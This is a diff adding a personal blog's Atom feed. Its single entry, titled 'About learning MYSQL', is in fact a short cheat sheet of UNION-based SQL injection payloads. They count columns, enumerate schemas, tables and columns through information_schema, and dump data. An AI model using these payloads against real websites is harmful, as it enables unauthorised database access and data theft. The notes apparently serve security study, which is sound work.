@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+<generator uri="http://jekyllrb.com" version="3.6.0">Jekyll</generator>
+<link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" />
+<link href="http://localhost:4000/" rel="alternate" type="text/html" />
+<updated>2017-09-30T13:35:19+08:00</updated>
+<id>http://localhost:4000/</id>
+<subtitle>NEVER GIVE UP</subtitle>
+<author>
+<name>void0red</name>
+</author>
+<entry>
+<title>About learning MYSQL</title>
+<link href="http://localhost:4000/2017/09/24/mysql.html" rel="alternate" type="text/html" title="About learning MYSQL" />
+<published>2017-09-24T00:00:00+08:00</published>
+<updated>2017-09-24T00:00:00+08:00</updated>
+<id>http://localhost:4000/2017/09/24/mysql</id>
+<content type="html" xml:base="http://localhost:4000/2017/09/24/mysql.html">&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+id=? order by n
+union select null,null,~,n
+
+#find_schema:
+union select 1,2,~,group_concat(schema_name),~,n from information_schema.schemata
+#find_tables:
+union select 1,2,~,group_concat(table_name),~,n from information_schema.tables where table_schema=&quot;~~&quot;
+#find_columns:
+union select 1,2,~,group_concat(column_name),~,n from information_schema.columns where table_schema=&quot;~~&quot; and table_name=&quot;~~&quot;
+
+#get data
+union select 1,2,~,group_concat(column),~,n from schema.table
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</content>
+<category term="others" />
+<summary>```</summary>
+</entry>
+</feed>
